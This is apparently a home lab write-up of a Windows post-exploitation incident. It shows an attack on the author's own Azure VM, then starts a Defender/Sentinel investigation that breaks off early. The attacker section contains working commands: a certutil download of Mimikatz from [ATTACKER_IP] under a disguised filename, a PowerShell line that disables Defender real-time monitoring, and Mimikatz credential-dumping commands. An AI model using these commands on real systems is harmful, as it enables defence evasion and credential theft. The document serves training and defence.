# Post-Exploitation Incident Investigation

## Context
We detect post-exploitation activity on one of our VMs. We are tasked with investigating the following points:
1. Whether this is a false or true positive
2. If true, the actions taken by the threat actor
3. The impact and evidence of further compromise

## Attacker's Perspective
As the attacker, we gained local admin access via RDP to a Windows VM hosted on a company's Azure cloud network. With this acces, our goal is to enumerate as much as possible and find any information that can help in lateral movement or further compromise of the network. 

#### 1. Basic Enumeration
We first get a lay of the land by doing some basic enumeration using the following commands:
- `whoami`
- `whoami /priv`
- `tasklist /svc`
- `netstat antp`
- `whoami /groups`

<img width="1664" height="934" alt="image" src="https://github.com/user-attachments/assets/e400704e-7f64-4fcd-aa9c-739dd700a9c9" />

<img width="1678" height="1082" alt="image" src="https://github.com/user-attachments/assets/bd7e0b54-8842-43d6-8601-a9c4bc80964d" />

#### 2. Download Script From Attacker Machine
We discover that we are a part of the Administrator group! We now proceed to transfer over Mimikatz, a super popular, open-source credential extracting tool, from our local attacker machine to the compromised VM. 

To do this, we'll first start up a web server on our attacker's local machine using Python:
1. Get local IP: `ifconfig`
2. Start Python web server: `python3 -m http.server 8080`

Next, we'll use the native Windows tool, `certutil` to download the `mimikatz.exe` file:

` certutil -urlcache -f http://[ATTACKER_IP]:8080/mimikatz.exe it_support.exe`

<img width="1480" height="282" alt="image" src="https://github.com/user-attachments/assets/6cab6048-f69c-4bd1-bce3-7e51f8b5b56e" />

<img width="942" height="870" alt="image" src="https://github.com/user-attachments/assets/64036c7b-8e63-48db-8c57-ac57ab895308" />

We're stopped by the antivirus. Let's disable it and try again using this PowerShell command:

`Set-MpPreference -DisableRealtimeMonitoring $true`

<img width="738" height="370" alt="Screenshot 2026-02-14 at 4 39 53 PM" src="https://github.com/user-attachments/assets/d11f6d2c-b881-4235-964d-42c0bd40038a" />

Successfully downloaded `Mimikatz` disguising it as an IT support script!

#### 3. Run Mimikatz and Extract Credentials

These are the steps to extract credentials using `Mimikatz`:
- NOTE: One must run the script with a local admin account!
1. Run script: `.\it_support.exe`
2. Set necessary privileges to extract credentials: `privilege::debug`
3. Retrieve credentials: `sekurlsa::logonpasswords`

Running the above commands gives us the following output:

<img width="458" height="402" alt="Screenshot 2026-02-14 at 4 51 30 PM" src="https://github.com/user-attachments/assets/38e68475-9949-4287-8d02-e57d0382a58e" />

Unfortunately(?) we were not able to extract any other credentials from the compromised machine! 

This concludes our attacker scenario and we'll look at this incident from the blue team's perspective now.

## Defender (Blue team) Perspective

We login to our Microsoft Defender portal to find an incident with a priority of 100.

<img width="2676" height="1330" alt="image" src="https://github.com/user-attachments/assets/90f0dc52-3b49-4e1e-a2b4-7c042844c5af" />

<img width="2514" height="618" alt="image" src="https://github.com/user-attachments/assets/79a40ac3-ca3e-485c-a34a-5693945c828d" />

Some of the events in the Incident Names section include Mimikatz, turning off Defender, and hands-on keyboard attack. We immediately assign the ticket to ourselves and follow the NIST 800-61 Incident Response process.

<img width="1134" height="1162" alt="image" src="https://github.com/user-attachments/assets/1ee1f32f-15e5-4797-ace7-15e3341e72e8" />

#### 1. Preparation

Tools and processes are already set up so we will skip this step.

#### 2. Detection and Analysis

In this phase, we will look to answer 3 questions:
1. Is this a false positive?
2. If not, what are the indicators of compromise (IoC)?
3. What is the impact of the attack and is there evidence of further compromise?

We'll query the logs on Microsoft Sentinel using the Kusto Query Language (KQL)

#### 2.1 Determining False Positive

